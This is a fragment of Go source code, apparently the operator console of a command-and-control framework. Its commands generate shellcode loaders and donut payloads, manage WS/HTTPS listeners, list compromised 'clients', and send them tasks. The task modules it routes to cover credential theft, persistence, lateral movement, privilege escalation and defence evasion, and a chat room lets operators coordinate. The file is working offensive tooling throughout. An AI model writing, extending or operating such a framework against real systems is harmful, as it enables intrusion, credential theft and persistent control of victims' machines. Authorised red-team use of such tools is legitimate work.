	shell.AddCmd(&ishell.Cmd{
		Name: "loader",
		Help: "generate loaders",
		Func: func(c *ishell.Context) {
			c.Println("Example ->  C:\\Temp\\shellcode.bin")
			PrepareLoader(c)
		},
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "donut",
		Help: "generate donut shellcode",
		Func: func(c *ishell.Context) {
			c.Println(`Example ->  c:\\\\tmp\\payload.exe "-h"`)
			c.Println(`Example ->  c:\\\\tmp\\payload.exe "-c ExampleClass -m ExampleMethod -p 'method parameters' -a x64 -o C:\\Tmp\\out.dll.bin -i C:\\Payload.exe" `)
			c.Println(`Example ->  c:\\\\tmp\\payload.exe "-f 1 -i C:\\Users\\Operator\\MessageBoxSharp.exe -o C:\\Tmp\\out.bin"`)
			PrepareDonut2(c)
		},
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "tasks",
		Help: "show tasks",
		Func: func(c *ishell.Context) {
			c.ShowPrompt(false)
			defer c.ShowPrompt(true)
			clientsArray, err := GetClientIds()
			if err != nil {
				c.Printf("%s", err.Error())
				return
			}
			choice := c.MultiChoice(clientsArray, "Choose a client")
			endpoint := fmt.Sprintf("https://%s:%s/v1/client/%s/tasks", ServerHostName, ServerRestPort, clientsArray[choice])
			body, err := DoGetRequest(endpoint)
			if err != nil {
				c.Printf("%s", err.Error())
				return
			}
			tasks := []data.Task{}
			err = json.Unmarshal(body, &tasks)
			if err != nil {
				c.Printf("%s", err.Error())
				return
			}
			if len(tasks) == 0 {
				c.Printf("No Tasks.")
				return
			}
			clean, err := json.MarshalIndent(tasks, "", " ")
			if err != nil {
				c.Printf("%s", err.Error())
				return
			}
			fmt.Printf("%s", string(clean))
		},
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "clients",
		Help: "show clients",
		Func: func(c *ishell.Context) {
			defer c.ShowPrompt(true) // yes, revert after login.
			c.ShowPrompt(false)
			endpoint := fmt.Sprintf("https://%s:%s/v1/clients", ServerHostName, ServerRestPort)
			body, err := DoGetRequest(endpoint)
			if err != nil {
				c.Printf("%s", err.Error())
				return
			}
			clients := make(map[string]data.Client)
			err = json.Unmarshal(body, &clients)
			if err != nil {
				c.Printf("%s", err.Error())
				return
			}
			for k, v := range clients {
				v.Tasks = nil
				v.Results = nil
				clients[k] = v

			}
			clean, err := json.MarshalIndent(clients, "", " ")
			fmt.Printf("%s\n", string(clean))
		},
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "listeners",
		Help: "show listeners",
		Func: func(c *ishell.Context) {
			defer c.ShowPrompt(true) // yes, revert after login.
			c.ShowPrompt(false)
			endpoint := fmt.Sprintf("https://%s:%s/v1/listeners", ServerHostName, ServerRestPort)
			body, err := DoGetRequest(endpoint)
			if err != nil {
				c.Printf("%s", err.Error())
				return
			}
			clients := make(map[string]data.Listener)
			err = json.Unmarshal(body, &clients)
			if err != nil {
				c.Printf("%s", err.Error())
				return
			}
			clean, err := json.MarshalIndent(clients, "", " ")
			fmt.Printf("%s\n", string(clean))
		},
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "delete_listener",
		Help: "delete listeners",
		Func: func(c *ishell.Context) {
			defer c.ShowPrompt(true) // yes, revert after login.
			c.ShowPrompt(false)
			c.Print("Enter port to shutdown: ")
			port := c.ReadLine()
			endpoint := fmt.Sprintf("https://%s:%s/v1/listener/%s", ServerHostName, ServerRestPort, port)
			body, err := DoDeleteRequest(endpoint)
			if err != nil {
				c.Printf("%s", err.Error())
				return
			}
			fmt.Printf("%s\n", string(body))
		},
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "create_listener",
		Help: "create listeners",
		Func: func(c *ishell.Context) {
			defer c.ShowPrompt(true) // yes, revert after login.
			c.ShowPrompt(false)
			endpoint := fmt.Sprintf("https://%s:%s/v1/listeners", ServerHostName, ServerRestPort)
			c.Print("Enter Port: ")
			port := c.ReadLine()
			c.Print("Enter Label: ")
			label := c.ReadLine()
			choice := c.MultiChoice([]string{"WS", "HTTPS"}, "Choose Listener Type")
			listener := data.Listener{
				Port:     port,
				Listener: data.ListenerType(choice),
				Label:    label,
			}
			data, err := json.Marshal(listener)
			if err != nil {
				c.Printf("%s", err.Error())
				return
			}
			body, err := DoPostRequest(endpoint, data)
			if err != nil {
				c.Printf("%s", err.Error())
				return
			}
			fmt.Printf("%s\n", string(body))
		},
	})
	shell.AddCmd(&ishell.Cmd{
		Name: "interact",
		Help: "interact with agents.",
		Func: func(c *ishell.Context) {
			clientsArray, err := GetOnlineClientIds() //GetClientIds()
			if err != nil {
				c.Printf("%s", err.Error())
				return
			}
			if len(clientsArray) == 0 {
				c.Printf("No clients online")
				return
			}
			choice := c.MultiChoice(clientsArray, "Choose a client")
			selectedClient := clientsArray[choice]
			//prompt := fmt.Sprintf("%s >>> ", selectedClient)
			//shell.SetPrompt(prompt)
			//c.Printf(prompt)
			//c.ShowPrompt(true)
			cmdChoice := c.MultiChoice(modules.BasicModulesList[:], "Execute a command.")
			switch modules.BasicModulesList[cmdChoice] {
			case "exit":
				shell.SetPrompt(">>> ")
				return
			case "enumeration":
				cmdChoice = c.MultiChoice(modules.EnumerationModulesList[:], "Execute a command.")
				SendTask(selectedClient, modules.EnumerationModulesList[cmdChoice], c)
				shell.SetPrompt(">>> ")
				return
			case "impersonation":
				cmdChoice = c.MultiChoice(modules.ImpersonationModulesList[:], "Execute a command.")
				SendTask(selectedClient, modules.ImpersonationModulesList[cmdChoice], c)
				shell.SetPrompt(">>> ")
				return
			case "persistence":
				cmdChoice = c.MultiChoice(modules.PersistenceModulesList[:], "Execute a command.")
				SendTask(selectedClient, modules.PersistenceModulesList[cmdChoice], c)
				shell.SetPrompt(">>> ")
				return
			case "lateral-movement":
				cmdChoice = c.MultiChoice(modules.LateralMovementModulesList[:], "Execute a command.")
				SendTask(selectedClient, modules.LateralMovementModulesList[cmdChoice], c)
				shell.SetPrompt(">>> ")
				return
			case "execution":
				cmdChoice = c.MultiChoice(modules.ExecutionModulesList[:], "Execute a command.")
				SendTask(selectedClient, modules.ExecutionModulesList[cmdChoice], c)
				shell.SetPrompt(">>> ")
				return
			case "evasion":
				cmdChoice = c.MultiChoice(modules.EvasionModulesList[:], "Execute a command.")
				SendTask(selectedClient, modules.EvasionModulesList[cmdChoice], c)
				shell.SetPrompt(">>> ")
				return
			case "privilege-escalation":
				cmdChoice = c.MultiChoice(modules.PrivilegeEscalationModulesList[:], "Execute a command.")
				SendTask(selectedClient, modules.PrivilegeEscalationModulesList[cmdChoice], c)
				shell.SetPrompt(">>> ")
				return
			case "credentials":
				cmdChoice = c.MultiChoice(modules.CredentialsModulesList[:], "Execute a command.")
				SendTask(selectedClient, modules.CredentialsModulesList[cmdChoice], c)
				shell.SetPrompt(">>> ")
				return
			default:
				SendTask(selectedClient, modules.BasicModulesList[cmdChoice], c)
				shell.SetPrompt(">>> ")
				return
			}
		}})
	shell.AddCmd(&ishell.Cmd{
		Name: "operator",
		Help: "show operators.",
		Func: func(c *ishell.Context) {
			endpoint := fmt.Sprintf("https://%s:%s/v1/operators", ServerHostName, ServerRestPort)
			body, err := DoGetRequest(endpoint)
			if err != nil {
				c.Printf("%s", err.Error())
				return
			}
			ops := make(map[string]data.Operator)
			err = json.Unmarshal(body, &ops)
			if err != nil {
				log.Fatalf("Failed to unmarshal json")
			}
			data, err := json.MarshalIndent(ops, "", " ")
			if err != nil {
				log.Fatalf("Failed to unmarshal json")
			}
			c.Println(string(data))
		}})
	shell.AddCmd(&ishell.Cmd{
		Name: "chat",
		Help: "chat with operators.",
		Func: func(c *ishell.Context) {
			//defer c.ShowPrompt(true)
			//c.ShowPrompt(false)
			prompt := "* "
			shell.SetPrompt(prompt)
			c.Printf(prompt)
			c.ShowPrompt(true)
			time.Sleep(time.Second * 1)
			InChatRoom = true
			for {
				message := c.ReadLine()
				if message == "exit" {
					InChatRoom = false
					break
				}
				SendChatMessage(message)
			}
			c.SetPrompt(">>> ")
			c.ShowPrompt(false)
			c.ShowPrompt(true)
			c.Printf(">>> ")
		}})
	shell.Run()
}

func OperatorLeaveChat() {
	Operator.ChatConn.CloseConnection()
}

func OperatorChatHandler(connection *data.Connection) {
	for {
		msg, err := connection.ReadMessage()
		if err != nil {
			continue
		}
		if string(msg) == "u there?" {
			continue
		}
		if InChatRoom {
			fmt.Println(string(msg))
			fmt.Printf("* ")
		} else {
			continue
		}
	}
}

func OperatorJoinChat() {
	socketUrl := fmt.Sprintf("wss://%s:%s/operatorChat", ServerHostName, ServerWSPort)
	var err error
	c, _, err := websocket.DefaultDialer.Dial(socketUrl,
		http.Header{
			"nick":          []string{Operator.OperatorNick},
			"shared-secret": []string{ServerSharedSecret},
		})
	Operator.ChatConn = data.NewConnection(c)
	if err != nil {
		log.Fatal("Error connecting to Websocket Server:", err)
	}
	go OperatorChatHandler(Operator.ChatConn)
}
